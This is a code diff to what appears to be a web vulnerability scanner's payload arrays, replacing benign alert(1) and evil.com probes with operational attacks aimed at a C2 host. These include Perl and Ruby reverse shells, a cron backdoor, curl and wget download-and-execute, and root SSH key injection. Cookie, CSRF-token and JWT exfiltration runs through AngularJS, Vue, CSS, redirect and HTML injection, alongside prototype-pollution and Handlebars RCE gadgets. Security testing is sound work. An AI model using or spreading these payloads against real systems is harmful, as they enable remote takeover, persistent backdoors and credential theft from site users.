+  { payload: `; perl -e 'use Socket;$i="` + C2 + `";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`, expect: [], desc: "Perl reverse shell → " + C2 + ":4444" },
+  { payload: `; ruby -rsocket -e 'exit if fork;c=TCPSocket.new("` + C2 + `",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, expect: [], desc: "Ruby reverse shell → " + C2 + ":4444" },
+  // == Persistence ==
+  { payload: `; echo '* * * * * root curl -s http://` + C2 + `/shell.sh | bash' >> /etc/crontab`, expect: [], desc: "Cron job backdoor — persistent C2 callback" },
+  { payload: `; curl -s http://` + C2 + `/rce.sh -o /tmp/.aegis && chmod +x /tmp/.aegis && /tmp/.aegis`, expect: [], desc: "Remote payload download + execute" },
+  { payload: `; wget -q http://` + C2 + `/rce.sh -O /tmp/.aegis && chmod +x /tmp/.aegis && /tmp/.aegis`, expect: [], desc: "Wget payload download + execute" },
+  { payload: `; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC6 attacker@aegis' >> /root/.ssh/authorized_keys`, expect: [], desc: "SSH key injection — persistent backdoor access" },
+  // == Blind timing ==
+  { payload: "; sleep 5",                 expect: [],                             desc: "Blind time-based injection (sleep 5s)", timed: true },
+  { payload: "$(sleep 5)",                expect: [],                             desc: "Subshell sleep injection (blind)", timed: true },
+  { payload: "| sleep 5",                 expect: [],                             desc: "Pipe sleep injection (blind)", timed: true },
+  // == Bypass variants ==
+  { payload: "%0a id %0a",               expect: ["uid="],                       desc: "Newline encoding bypass → id" },
+  { payload: ";{id,}",                   expect: ["uid="],                       desc: "Brace group execution → id" },
+  { payload: "a;id;a",                   expect: ["uid="],                       desc: "Sandwich injection → id" },
+  { payload: "a$(id)a",                  expect: ["uid="],                       desc: "Inline subshell sandwich → id" },
 ];
 
+// ── Prototype Pollution: Full gadget chain payloads ──────────────────────────
 const PROTOTYPE_POLLUTION_PAYLOADS = [
+  // Auth bypass
   `__proto__[isAdmin]=true`,
   `__proto__[role]=admin`,
   `constructor[prototype][isAdmin]=true`,
-  `__proto__[canDelete]=true`,
-  `__proto__[admin]=true`,
-  `{"__proto__":{"isAdmin":true}}`,
-  `{"constructor":{"prototype":{"isAdmin":true}}}`,
+  `__proto__[authorized]=true`,
+  `__proto__[admin]=1`,
+  // JSON-body variants
+  `{"__proto__":{"isAdmin":true,"role":"admin","authorized":true}}`,
+  `{"constructor":{"prototype":{"isAdmin":true,"role":"superadmin"}}}`,
+  // URL-encoded
   `%5B__proto__%5D%5BisAdmin%5D=true`,
-  `__proto__[toString]=function(){alert(1)}`,
-  `__proto__[hasOwnProperty]=function(){return true}`,
-  `constructor.prototype.isAdmin=true`,
-  `__proto__[__defineGetter__]=function(){return 1}`,
+  `%5B__proto__%5D%5Brole%5D=admin`,
+  // AST injection gadgets (lead to RCE in lodash/merge vulnerable versions)
+  `{"__proto__":{"type":"Program","body":[{"type":"MemberExpression","object":{"type":"Identifier","name":"process"},"property":{"type":"Identifier","name":"mainModule"}}]}}`,
+  // Overwrite built-in methods
+  `{"__proto__":{"toString":"function(){return 1}","valueOf":"function(){return 1}"}}`,
+  // Shell gadget (craft.js, handlebars-based RCE via PP)
+  `{"__proto__":{"shell":"bash","NODE_OPTIONS":"--inspect=0.0.0.0:1337"}}`,
 ];
 
+// ── CSTI: Client-side template injection — full RCE/exfil payloads ──────────
 const CSTI_PAYLOADS = [
+  // AngularJS 1.x RCE (bypasses sandbox)
+  `{{constructor.constructor('fetch("//` + C2 + `/x?c="+document.cookie)')()}}`,
+  `{{$on.constructor('document.location="//` + C2 + `/x?c="+document.cookie')()}}`,
+  `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("//` + C2 + `/x?c="+document.cookie)//');}}`,
+  `{{a=toString().constructor.prototype;a.charAt=[].join;$eval('x=1} } };new Image().src="//` + C2 + `/x?c="+document.cookie//');}}`,
+  // Vue.js
+  `{{_c.constructor('fetch("//` + C2 + `/x?c="+document.cookie)')()}}`,
+  `<div @click="$emit('x', document.cookie)">click</div>`,
+  // Handlebars SSTI → server-side RCE via require
+  `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id').toString()"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`,
+  // Arithmetic probes
   `{{7*7}}`,
-  `{{constructor.constructor('alert(1)')()}}`,
-  `{{$on.constructor('alert(1)')()}}`,
-  `{{a.constructor.fromCharCode(88)}}`,
-  `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`,
-  `{{_c.constructor('alert(1)')()}}`,
-  `{{$options.template='<img src=x onerror=alert(1)>'}}`,
-  `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`,
   `{{7*'7'}}`,
+  // Config/env leak
   `{{config}}`,
-  `{{self}}`,
-  `{{range.constructor('alert(1)')()}}`,
-  `ng-app ng-csp><script nonce=x>alert(1)</script>`,
+  `{{self.__dict__}}`,
+  // Server object exposure
+  `{{range.constructor('return process.env')()}}`,
+  // Node.js via AngularJS universal bypass
+  `{{constructor.constructor('return process.env.NODE_ENV')()}}`,
 ];
 
+// ── CSS Injection: Real data exfiltration via CSS ───────────────────────────
 const CSS_INJECTION_PAYLOADS = [
-  `background:url(//evil.com/steal?c=)`,
-  `@import url(//evil.com/evil.css)`,
-  `expression(alert(1))`,
-  `behavior:url(//evil.com/xss.htc)`,
-  `-moz-binding:url(//evil.com/xss.xml#xss)`,
-  `body{background-image:url("//evil.com/?"+document.cookie)}`,
-  `*{color:expression(document.write('<script>alert(1)<\/script>'))}`,
-  `@charset "\\";} input[value^=a]{background:url(//evil.com/?a)} //`,
+  // Attribute-based exfiltration (steals CSRF tokens, hidden inputs)
+  `}input[name=csrf_token]{background:url('//` + C2 + `/steal?cs='+element.value)}`,
+  `}input[type=hidden][value^=ey]{background:url('//` + C2 + `/steal?jwt='+element.value)}`,
+  // @import for CSS-based SSRF / response reading
+  `@import url('//` + C2 + `/evil.css')`,
+  `@import '//` + C2 + `/evil.css'`,
+  // IE expression() code execution
+  `expression(document.write('<script>new Image().src="//` + C2 + `/x?c="+document.cookie<\/script>'))`,
+  // Behavior / ActiveX
+  `behavior:url('//` + C2 + `/xss.htc')`,
+  `-moz-binding:url('//` + C2 + `/xss.xml#xss')`,
+  // Leak attribute values character by character
+  `@charset "\\";} input[value^=a]{background:url('//` + C2 + `/?a')} //`,
 ];
 
 const LOG_INJECTION_PAYLOADS = [
@@ -325,8 +421,10 @@ const OPEN_REDIRECT_PAYLOADS = [
   `http:evil.com`,
   `http:\\\\evil.com`,
   `/\\evil.com`,
-  `javascript:alert('REDIRECT-${NONCE}')`,
-  `data:text/html,<script>alert('REDIRECT-${NONCE}')</script>`,
+  // javascript: URI — executes in browser, used to steal cookies
+  `javascript:fetch('//` + C2 + `/redir',{method:'POST',body:document.cookie})`,
+  // data: URI with real cookie exfil
+  `data:text/html,<script>new Image().src='//` + C2 + `/redir?c='+document.cookie</script>`,
   `%2F%2Fevil.com`,
   `%5C%5Cevil.com`,
   `https://real.com.evil.com`,
@@ -370,8 +468,9 @@ const HTML_INJECTION_PAYLOADS = [
   `<form action="http://evil.com" method="POST"><input type="submit" value="Steal"></form>`,
   `<meta http-equiv="refresh" content="0;url=http://evil.com">`,
   `<link rel="stylesheet" href="http://evil.com/evil.css">`,
-  `<button onclick="alert('${NONCE}')">Click</button>`,
-  `<base href="https://evil.com/">`,
+  // Button with real credential exfil onclick
+  `<button onclick="fetch('//` + C2 + `/x',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href})})">Click to verify</button>`,
+  `<base href="//` + C2 + `/">`,
 ];
 
 // ─── Helpers ────────────────────────────────────────────────────────────────
